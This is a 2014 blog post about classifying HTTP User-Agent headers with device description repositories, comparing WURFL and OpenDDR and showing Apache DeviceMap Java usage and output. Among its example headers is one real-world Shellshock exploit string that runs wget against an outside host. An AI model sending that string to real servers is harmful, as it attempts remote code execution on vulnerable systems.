---
kind: article
created_at: 2014-12-05 17:42 EET
title: Parsing User-Agent Strings with Apache DeviceMap
tags:
  - java
---

At work I am given the task of implementing a basic device profiler service to
classify the incoming HTTP requests into a certain set of groups (desktop,
tablet, mobile, etc.) using the
[User-Agent](http://en.wikipedia.org/wiki/User_agent) header. It opens a
multitude of new dimensions both at the client- and server-side for interface
and content customizations tailored to the device. For instance, you can
disable some of your fancy gestures (e.g., `mouseover` events) that will not
be properly used on a touch screen. Or you might want to prioritize console
games for a client who uses a PlayStation to browse your shop.

I first tried to investigate and (if possible) evaluate the existing solutions
in the wild, including the commercial ones. And eventually decided to go with
[Apache DeviceMap](http://devicemap.apache.org/) that employs
[OpenDDR](https://github.com/OpenDDRdotORG/OpenDDR-Resources) in the
background. In this blog post, I tried to wrap up a summary of the
*experience* I collected through out this pursuit.

Parsing a User-Agent string
===========================

While [Section 5.5.3](http://tools.ietf.org/html/rfc7231#section-5.5.3) of
*HTTP/1.1: Semantics and Content* specification has a lot to say about the
formatting of the User-Agent header, the first thing for sure is that there
are no restrictive rules that shape the header in a machine-readable format.
Consider the following examples:

- Mozilla/5.0 (Linux; Android 4.2.1; GT-H9500 Build/JOP40D) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/36.0.1985.131 Mobile Safari/537.36
- Mozilla/5.0 (PlayStation Vita 3.18) AppleWebKit/536.26 (KHTML, like Gecko)
  Silk/3.2
- Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-B5510B Build/GINGERBREAD)
- Opera/9.50 (Nintendo DSi; Opera/507; U; en-GB)

I can even show you more fancier ones:

- MIKI50_6464_11B_24MP_HW
  (MRE/3.0.00(800);MAUI/51TV_V01_01_130227;BDATE/2013/02/27
  19:19;LCD/320240;CHIP/MT6250;KEY/QWERT;TOUCH/0;CAMERA/1;SENSOR/0;DEV/MIKI50_6464_11B_24MP_HW;WAP
  Browser/MAUI
  (HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;K)
  RLG_G51TV_V01_01_130227 Release/2013.02.27 WAP Browser/MAUI (HTTPS) Profile/
  Q03C1-2.40 en-US
- Apache-HttpClient/4.1.3 (java 1.5)
- WWW-Mechanize/1.73
- Java/1.6.0_22
- Scrapy/0.24.4 (+http://scrapy.org)
- WordPress/3.1.3; http://www.unileverventures.com

And some annoying ones:

- LAVA.DISCOVER 137*.HEXING60A_COSMOS_11B_HW
  (MRE/3.1.00(1500);MAUI/308;BDATE/2013/11/20
  11:14;LCD/320480;CHIP/MT6260;KEY/Reduced;TOUCH/1;CAMERA/0;SENSOR/0;DEV/HEXING60A_COSMOS_11B_HW;WAP
  Browser/MAUI (HTTP
  PGDL;HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;KKF)
  11BW1308 Release/2013.11.20 WAP Browser/MAUI (HTTP PGDL; HTTPS)
  Profile/Profile/MIDP-2.0 Configuration/CLDC-1.1 Q03C1-2.40 en-US
- shellshocker='() { wget
  http://yourschool.net/.tmp/frogclog.php?http://www.ebay.com/ago-rari-1-43/1004004009042189/;
  }' bash -c shellshocker

So making a conclusion on which part denotes the product name, version, etc.
is a fuzzy, tedious and error-prone task. That being said, there is another
thing we can do here! Every User-Agent is more or less unique to the device
that the software runs on. Hence, if we can come up with a database such that
User-Agent strings are mapped to devices, we can employ this database to find
the device of a certain User-Agent. This is where the term [Device Description
Repository](http://en.wikipedia.org/wiki/Device_Description_Repository) (DDR)
kicks in:

> The Device Description Repository is a concept proposed by the Mobile Web
> Initiative Device Description Working Group (DDWG) of the World Wide Web
> Consortium. The DDR is supported by a standard interface and an initial core
> vocabulary of device properties. Implementations of the proposed repository
> are expected to contain information about Web-enabled devices (particularly
> mobile devices).

The Rise of DDR
===============

[WURFL](http://en.wikipedia.org/wiki/WURFL) (Wireless Universal Resource FiLe)
was the first community effort focused on mobile device detection and dates
back to 2007. While WURFL was initially released under an "open source /
public domain" license, in June 2011, project's founders formed ScientiaMobile
to provide commercial mobile device detection support and services using
WURFL. As of now, the [ScientiaMobile](http://www.scientiamobile.com/) WURFL
APIs are licensed under a dual-license model, using the AGPL license for
non-commercial use and a proprietary commercial license. In a world dominated
by capitalism, the current version of the WURFL database itself is no longer
open source. Inspired by WURFL and motivated by the gap in the market, it did
not take much for alternative companies to emerge, including, but is not
limited to, [DeviceAtlas](https://deviceatlas.com/), [Handset
Detection](http://www.handsetdetection.com/), and
[51degrees](http://51degrees.com/).

So how far one can go using a DDR to detect the properties of a device by just
looking at the User-Agent header? Below is a sample output that I collected
from [51degrees](http://51degrees.com/):

- HardwarePlatform
    - Camera
        - Has3DCamera: False
        - HasCamera: False
    - Connectivity
        - HasNFC: False
    - Device
        - DeviceType: Desktop
    - Inputs
        - HasKeypad: False
        - HasQwertyPad: True
        - HasTouchScreen: False
        - HasTrackPad: True
        - HasVirtualQwerty: False
    - Name
        - HardwareFamily: Macintosh
        - HardwareModel: Macintosh
        - HardwareName: Macintosh
        - HardwareVendor: Apple
        - OEM: Apple
    - Screen
        - Has3DScreen: False
        - ScreenInchesDiagonalRounded: Unknown
        - ScreenInchesSquare: Unknown
        - ScreenMMDiagonalRounded: Unknown
        - ScreenMMSquare: Unknown
        - SuggestedImageButtonHeightMms: 3.5
        - SuggestedImageButtonHeightPixels: 11.8
        - SuggestedLinkSizePixels: 11.8
        - SuggestedLinkSizePoints: 10
    - Stats
        - Popularity: 1674140546
    - Tv
        - ContrastRatio: N/A
        - EnergyConsumptionPerYear: N/A
        - OnPowerConsumption: N/A
        - RefreshRate: N/A
    - Miscellaneous
        - HardwareImages: Front, Posed
- SoftwarePlatform
    - Ccpp
        - CcppAccept: application/java, application/java-archive,
          application/vnd.oma.dd+xml, application/vnd.oma.drm.content,
          application/vnd.oma.drm.message,
          application/vnd.oma.drm.rights+wbxml,
          application/vnd.oma.drm.rights+xml,
          application/vnd.wap.multipart.mixed, application/vnd.wap.wbxml,
          application/vnd.wap.wmlscriptc, application/vnd.wap.xhtml+xml,
          application/x-compress, application/x-gzip, application/xhtml+xml,
          audio/3ga, audio/3gpp, audio/aac, audio/amr, audio/asf, audio/asx,
          audio/awb, audio/m4a, audio/m4b, audio/midi, audio/mp3, audio/mp3d,
          audio/mp4, audio/MP4A-ES, audio/MP4A-LATM, audio/wav, audio/wma,
          image/2bp, image/bmp, image/gif, image/jpeg, image/jpg, image/png,
          image/tif, image/tiff, image/vnd.wap.wbmp, image/wbmp,
          message/rfc822, text/css, text/html, text/plain,
          text/vnd.sun.j2me.app-descriptor, text/vnd.wap.wml, text/x-ical,
          text/xml, text/xsl, text/x-vcal, video/3g2, video/3gp, video/3gpp,
          video/divx, video/flv, video/H263-2000, video/H264, video/m4v,
          video/mp4, video/MP4V-ES, video/wmv, video/xvid
    - Name
        - PlatformName: Mac OS X
        - PlatformVendor: Apple
        - PlatformVersion: 10.9
        - BrowserUA: - Css
        - CssBackground: True
        - CssBorderImage: True
        - CssCanvas: True
        - CssColor: True
        - CssColumn: False
        - CssFlexbox: True
        - CssFont: True
        - CssImages: False
        - CssMediaQueries: True
        - CssMinMax: True
        - CssOverflow: True
        - CssPosition: True
        - CssText: False
        - CssTransforms: True
        - CssTransitions: True
        - CssUI: False
    - Data
        - DataSet: True
        - DataUrl: True
    - DOM
        - DeviceOrientation: False
    - File
        - FileReader: True
    - General
        - AjaxRequestType: Standard
        - AnimationTiming: True
        - BlobBuilder: True
        - BrowserPropertySource: Caniuse
        - FormData: True
        - Iframe: True
        - IndexedDB: True
        - jQueryMobileSupport: A-Grade
        - LayoutEngine: Blink
        - Masking: False
        - PostMessage: True
        - Prompts: True
        - Selector: True
        - TouchEvents: True
        - Track: True
    - GPS
        - GeoLocation: True
    - Html
        - Html-Media-Capture: True
        - HtmlVersion: 5.0
    - Javascript
        - Javascript: True
        - JavascriptCanManipulateCSS: True
        - JavascriptCanManipulateDOM: True
        - JavascriptGetElementById: True
        - JavascriptSupportsEventListener: True
        - JavascriptSupportsEvents: True
        - JavascriptSupportsInnerHtml: True
        - JavascriptVersion: 1.8.5
    - JSON
        - Json: True
    - Name
        - BrowserName: Chrome
        - BrowserVendor: Google
        - BrowserVersion: 38
    - Screen
        - Fullscreen: True
    - Supported Media
        - SupportsTls/Ssl: True
        - Svg: True
        - Video: True
    - ViewPort
        - Viewport: True
    - Web
        - CookiesCapable: True
        - History: True
        - Progress: True
        - WebWorkers: True
        - Xhr2: True
- Crawler
    - Miscellaneous
        - IsCrawler: False

Per see, what they can get by just looking at your User-Agent header is (to put
it mildly) *a lot*!

Long live F/OSS!
================

As usual, community's response did not take long and the most recent open
source version of WURFL (dating back to 2011) is forked under the
[OpenDDR](https://github.com/OpenDDRdotORG/OpenDDR-Resources) project. Later
on, community kept updating the database by the effort of individual
contributors.

While OpenDDR file format allows hierarchical device representation as in
WURFL, it rather maps each device to a set of attributes explicitly. To make a
comparison, see how WURFL takes advantage of its hierarchical device
representation:

    #!xml
    <device user_agent="Nokia7110/1.0 (04"
            fall_back="nokia_generic"
            id="nokia_7110_ver1">
        <!-- ... -->
        <group id="ui">
            <!-- ... -->
            <capability name="table_support" value="false" /> 
        </group>
    </device>

    <device user_agent="Nokia7110/1.0 (04.67)"
            fall_back="nokia_7110_ver1"
            id="nokia_7110_ver1_sub467" /> 

    <device user_agent="Nokia7110/1.0 (04.69)"
            fall_back="nokia_7110_ver1"
            id="nokia_7110_ver1_sub469" /> 

    <!-- ... -->

    <device user_agent="Nokia7110/1.0 (04.94)"
            fall_back="nokia_7110_ver1"
            id="nokia_7110_ver1_sub494" /> 

    <!-- 7110 new-age -->
    <device user_agent="Nokia7110/1.0 (05"
            fall_back="nokia_7110_ver1"
            id="nokia_7110_ver2">
        <group id="ui">
            <capability name="table_support" value="true" /> 
        </group>
    </device>

    <device user_agent="Nokia7110/1.0 (05.00)"
            fall_back="nokia_7110_ver2" 
            id="nokia_7110_ver1_sub500" />

    <device user_agent="Nokia7110/1.0 (05.01)"
            fall_back="nokia_7110_ver2"
            id="nokia_7110_ver1_sub501" />

On the other hand, OpenDDR follows a more flat model:

    #!xml
    <device id="SAMSUNG-SGH-i780" parentId="genericSamsung">
        <property name="model" value="SGH-i780"/>
        <property name="displayWidth" value="320"/>
        <property name="displayHeight" value="320"/>
        <property name="mobile_browser" value="Microsoft Mobile Explorer"/>
        <property name="mobile_browser_version" value="7.7"/>
        <property name="device_os" value="Windows Mobile OS"/>
        <!-- ... -->
    </device>
    <device id="sholest" parentId="genericMotorola">
        <property name="model" value="XT701"/>
        <property name="marketing_name" value="Sholes Tablet"/>
        <property name="displayWidth" value="480"/>
        <!-- ... -->
        <property name="ajax_support_getelementbyid" value="true"/>
        <property name="ajax_support_inner_html" value="true"/>
        <property name="ajax_manipulate_dom" value="true"/>
        <property name="ajax_manipulate_css" value="true"/>
        <property name="ajax_support_events" value="true"/>
        <property name="ajax_support_event_listener" value="true"/>
        <property name="image_inlining" value="true"/>
        <property name="from" value="open_db_modified"/>
    </device>
    <device id="bravo" parentId="genericHTC">
        <property name="model" value="A8183"/>
        <property name="marketing_name" value="Bravo"/>
        <property name="displayWidth" value="480"/>
        <!-- ... -->
        <property name="ajax_manipulate_css" value="true"/>
        <property name="ajax_support_events" value="true"/>
        <property name="ajax_support_event_listener" value="true"/>
        <property name="image_inlining" value="true"/>
        <property name="from" value="open_db_modified"/>
    </device>

Apache DeviceMap
================

While DDR exposes you an almost exhaustive set of device vendors, models, and
attributes, it does not provide you a search mechanism in this swamp. [Apache
DeviceMap](http://devicemap.apache.org/) (which is graduating from incubation
as of this writing) is a project that fills this gap. DeviceMap basically
ships two fundamental Maven artifacts: an OpenDDR clone (`devicemap-data`) and
a driver (`devicemap-client`) available for Visual Basic, C# and Java
programming languages.

Usage of Apache DeviceMap is pretty straigt forward. You first include
necessary set of dependencies in your POM file:

    #!xml
    <dependency>
        <groupId>org.apache.devicemap</groupId>
        <artifactId>devicemap-data</artifactId>
        <version>1.0.2-SNAPSHOT</version>
    </dependency>
    <dependency>
        <groupId>org.apache.devicemap</groupId>
        <artifactId>devicemap-client</artifactId>
        <version>1.1.0-SNAPSHOT</version>
    </dependency>

And then enjoy the API exposed by the driver:

    #!java
    import org.apache.devicemap.DeviceMapClient;
    import org.apache.devicemap.loader.LoaderOption;

    // Create a DeviceMapClient instance.
    DeviceMapClient deviceMapClient = new DeviceMapClient();
    deviceMapClient.initDeviceData(LoaderOption.JAR);

    // Try to classify a sample User-Agent parameter using the DeviceMapClient.
    String desc = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) " +
                  "AppleWebKit/537.36 (KHTML, like Gecko) " +
                  "Chrome/38.0.2125.104 Safari/537.36":
    Map<String, String> attrs = deviceMapClient.classify(desc);

    // Dump found attributes.
    if (attrs != null)
        for (Map.Entry<String, String> attr : attrs.entrySet())
            System.out.format("%s = %s\n", attr.getKey(), attr.getValue());

In the following you can find the output of the above snippet:

    displayHeight = 600
    ajax_support_inner_html = true
    mobile_browser_version = -
    is_tablet = false
    ajax_support_getelementbyid = true
    ajax_support_javascript = true
    ajax_manipulate_dom = true
    ajax_manipulate_css = true
    vendor = -
    model = -
    id = desktopDevice
    mobile_browser = -
    is_bot = false
    nokia_edition = 0
    is_wireless_device = false
    ajax_support_event_listener = true
    device_os = -
    inputDevices = -
    nokia_series = 0
    ajax_support_events = true
    xhtml_format_as_css_property = false
    displayWidth = 800
    marketing_name = -
    image_inlining = false
    device_os_version = -
    xhtml_format_as_attribute = false
    is_desktop = true
    dual_orientation = false

Per see, the output is not much detailed as the one we got from 51degrees.
Almost all of the crucial data is missing and there are some mistakes in
certain entries like display width and height. That being said, it got three
important bits right: `is_desktop`, `is_bot`, and `is_tablet`. Note that there
does not exist much of a mechanism to verify the correctness of the attributes
returned by the employed engine. That is, the nature of the problem also
implies the absance of a verification mechanism.

The Grand Decision
==================

If you had a chance to check out the website of the commercial DDR and
User-Agent detection solutions, you should have noticed the giant IT leaders
(Google, Facebook, PayPal, etc.) in their customers list. Hence, it was a
little bit tempting to go with a commercial solution. That being said, I also
wanted to evaluate the performance of the Apache DeviceMap. For that purpose,
I collected a couple of months worth visitor data at work and tried to resolve
User-Agent headers. The results were very promising and Apache DeviceMap
succeeded to resolve almost 90% of all the collected User-Agent strings. That
beign said, resolving a User-Agent -- that is, matching the given User-Agent
against DDR and returning a set of attributes -- does not imply the
correctness of the returned attributes. Nevertheless, I repeated the same
experiment with almost two dozens of different devices at work and it
succeeded in almost everyone.

Since the project that I am working on is still in its early stages and the
initial results are more than satisfactory, we concluded to go with Apache
DeviceMap. Further, we managed to increase its coverage up to 99% by
introducing some entries manually to do the database. Indeed, we
[reported](https://issues.apache.org/jira/browse/DMAP-104?jql=reporter%20in%20(vy))
a majority of those enhancements back to the Apache DeviceMap project.
